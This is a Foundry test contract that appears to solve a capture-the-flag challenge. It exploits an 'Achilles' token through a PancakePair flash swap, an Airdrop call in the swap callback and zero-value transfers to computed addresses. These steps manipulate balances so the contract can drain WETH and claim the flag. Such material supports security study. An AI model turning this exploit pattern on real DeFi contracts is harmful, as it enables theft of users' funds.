// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./SetUp.sol";

contract ContractTest is Test {

    SetUp setup;
    PancakePair pair;
    Achilles achilles;
    WETH weth;

    function setUp() public {
        
    }

    function testExp() public {
        setup = new SetUp();
        pair = PancakePair(setup.pair());
        achilles = Achilles(setup.achilles());
        weth = WETH(setup.weth());

        pair.swap(900 ether, 0, address(this), bytes("0x00001"));

        address to = address(uint160((uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(pair)))));
        achilles.transfer(to, 0);
        console.log("Pair balance: %s", achilles.balanceOf(address(pair)));

        to = address(uint160((uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(this)))));
        achilles.transfer(to, 0);
        console.log("this balance: %s", achilles.balanceOf(address(this)));

        pair.sync();

        achilles.transfer(address(pair), 1);
        pair.swap(0, 100 ether, address(this), bytes("0x"));

        console.log("this weth balance: %s", weth.balanceOf(address(this)));

        require(setup.getFlag());
                
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {  
        achilles.Airdrop(1);
        achilles.transfer(address(pair), amount0);
    }
}